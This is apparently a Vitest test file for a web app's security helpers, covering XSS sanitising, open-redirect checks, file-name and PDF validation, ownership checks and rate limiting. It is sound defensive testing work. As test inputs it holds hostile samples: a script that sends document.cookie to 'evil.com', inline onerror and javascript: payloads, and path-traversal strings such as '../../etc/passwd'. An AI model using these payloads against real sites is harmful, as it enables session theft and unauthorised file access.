import { describe, it, expect, beforeEach } from "vitest";
import {
  escapeHtml,
  sanitizeInput,
  validateSafeRedirect,
  sanitizeFileName,
  validatePdfMagicBytes,
  assertResourceOwnership,
} from "@/lib/security";
import {
  checkRateLimit,
  resetRateLimit,
  RATE_LIMIT_CONFIGS,
} from "@/lib/rate-limit";

describe("Unit: Security Defenses & Input Sanitization", () => {
  describe("XSS Prevention: escapeHtml & sanitizeInput", () => {
    it("should escape special HTML entities", () => {
      const raw = `<script>alert("XSS & attack")</script>`;
      const escaped = escapeHtml(raw);
      expect(escaped).toBe(
        `&lt;script&gt;alert(&quot;XSS &amp; attack&quot;)&lt;/script&gt;`
      );
    });

    it("should strip malicious script tags and body contents in sanitizeInput", () => {
      const dirty = `Hello <script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>World`;
      const clean = sanitizeInput(dirty);
      expect(clean).toBe("Hello World");
    });

    it("should strip inline event handlers (onerror, onload, onclick)", () => {
      const dirty = `<img src="x" onerror="alert(1)" onload="evil()">Profile`;
      const clean = sanitizeInput(dirty);
      expect(clean).not.toContain("onerror");
      expect(clean).not.toContain("alert(1)");
      expect(clean).toContain("Profile");
    });

    it("should strip javascript: pseudo-protocols", () => {
      const dirty = `javascript:alert(document.domain)`;
      const clean = sanitizeInput(dirty);
      expect(clean).not.toContain("javascript:");
    });
  });

  describe("Open Redirect Defense: validateSafeRedirect", () => {
    it("should allow safe relative application paths", () => {
      expect(validateSafeRedirect("/dashboard")).toBe("/dashboard");
      expect(validateSafeRedirect("/dashboard/notes?id=123")).toBe("/dashboard/notes?id=123");
      expect(validateSafeRedirect("/dashboard/timetable")).toBe("/dashboard/timetable");
    });

    it("should reject external protocol-relative URLs", () => {
      expect(validateSafeRedirect("//evil.com")).toBe("/dashboard");
      expect(validateSafeRedirect("//phishing.site/login")).toBe("/dashboard");
    });

    it("should reject absolute external URLs", () => {
      expect(validateSafeRedirect("http://evil.com")).toBe("/dashboard");
      expect(validateSafeRedirect("https://attacker.org/steal")).toBe("/dashboard");
      expect(validateSafeRedirect("javascript:alert(1)")).toBe("/dashboard");
    });

    it("should reject URLs without leading slash", () => {
      expect(validateSafeRedirect("evil.com")).toBe("/dashboard");
      expect(validateSafeRedirect("dashboard/notes")).toBe("/dashboard");
    });

    it("should fall back to defaultUrl when provided", () => {
      expect(validateSafeRedirect(null, "/custom-fallback")).toBe("/custom-fallback");
      expect(validateSafeRedirect("//evil.com", "/login")).toBe("/login");
    });
  });

  describe("File Sanitization & Magic Bytes Validation", () => {
    it("should sanitize file names to prevent directory traversal and null bytes", () => {
      expect(sanitizeFileName("../../etc/passwd")).toBe("etc_passwd");
      expect(sanitizeFileName("..\\..\\windows\\system32\\cmd.exe")).toBe("windows_system32_cmd.exe");
      expect(sanitizeFileName("malicious\0file.pdf")).toBe("maliciousfile.pdf");
      expect(sanitizeFileName(".hidden_shell.php")).toBe("hidden_shell.php");
      expect(sanitizeFileName("normal-lecture-note_v1.pdf")).toBe("normal-lecture-note_v1.pdf");
    });

    it("should validate valid PDF magic bytes (%PDF- / 0x25 0x50 0x44 0x46 0x2D)", () => {
      // Valid PDF signature: %PDF-
      const validPdfHeader = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37]);
      expect(validatePdfMagicBytes(validPdfHeader)).toBe(true);

      // Malicious fake PDF (e.g. an EXE renamed to .pdf: MZ signature 0x4D 0x5A)
      const fakePdfExe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03]);
      expect(validatePdfMagicBytes(fakePdfExe)).toBe(false);

      // PNG image header
      const pngHeader = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d]);
      expect(validatePdfMagicBytes(pngHeader)).toBe(false);

      // Truncated buffer (< 5 bytes)
      expect(validatePdfMagicBytes(new Uint8Array([0x25, 0x50]))).toBe(false);
    });
  });

  describe("IDOR Protection: assertResourceOwnership", () => {
    const ownerId = "usr_student_01";
    const intruderId = "usr_attacker_99";

    it("should allow access when session user is the owner", () => {
      expect(() =>
        assertResourceOwnership(ownerId, ownerId, "USER")
      ).not.toThrow();
    });

    it("should throw access denied when another student attempts access", () => {
      expect(() =>
        assertResourceOwnership(ownerId, intruderId, "USER")
      ).toThrow(/Access Denied/);
    });

    it("should allow ADMIN role to bypass ownership restrictions for moderation/governance", () => {
      expect(() =>
        assertResourceOwnership(ownerId, intruderId, "ADMIN")
      ).not.toThrow();
    });
  });

  describe("Sliding-Window Rate Limiting", () => {
    const testIp = "192.168.1.100";

    beforeEach(() => {
      resetRateLimit(testIp, "AUTH");
    });

    it("should allow requests within rate limit maxRequests", () => {
      const maxAuthRequests = RATE_LIMIT_CONFIGS.AUTH.maxRequests; // 5

      for (let i = 0; i < maxAuthRequests; i++) {
        const result = checkRateLimit(testIp, "AUTH");
        expect(result.success).toBe(true);
        expect(result.remaining).toBe(maxAuthRequests - (i + 1));
      }
    });

    it("should throttle and block requests exceeding limit with retryAfter", () => {
      const maxAuthRequests = RATE_LIMIT_CONFIGS.AUTH.maxRequests; // 5

      // Exhaust limit
      for (let i = 0; i < maxAuthRequests; i++) {
        checkRateLimit(testIp, "AUTH");
      }

      // 6th attempt must be throttled
      const blocked = checkRateLimit(testIp, "AUTH");
      expect(blocked.success).toBe(false);
      expect(blocked.remaining).toBe(0);
      expect(blocked.retryAfter).toBeGreaterThan(0);
    });

    it("should allow requests again after reset", () => {
      // Exhaust
      for (let i = 0; i < 5; i++) {
        checkRateLimit(testIp, "AUTH");
      }
      expect(checkRateLimit(testIp, "AUTH").success).toBe(false);

      // Reset
      resetRateLimit(testIp, "AUTH");
      expect(checkRateLimit(testIp, "AUTH").success).toBe(true);
    });
  });
});
